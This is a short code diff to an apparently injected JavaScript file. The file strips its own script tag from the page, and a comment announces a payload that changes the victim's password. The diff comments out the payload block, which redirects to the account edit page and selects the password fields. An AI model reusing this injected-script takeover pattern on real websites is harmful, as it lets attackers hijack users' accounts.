@@ -7,7 +7,7 @@ var newHtml = oldHtml.slice(0, oldHtml.indexOf("<script src="+src+">"));//the fi
 
 document.body.innerHTML = newHtml + oldHtml.slice( newHtml.length + ("<script src="+src+">").length );
 //now we do the payload: change their password!
-var passInputs;
+/*var passInputs;
 
 if (location.href == document.querySelector('.welcome-edit-link').href) {
   passInputs = document.querySelectorAll("input[type=password]");
@@ -20,3 +20,4 @@ if (location.href == document.querySelector('.welcome-edit-link').href) {
 } else {
   location.href = document.querySelector('.welcome-edit-link').href;
 };
+*/
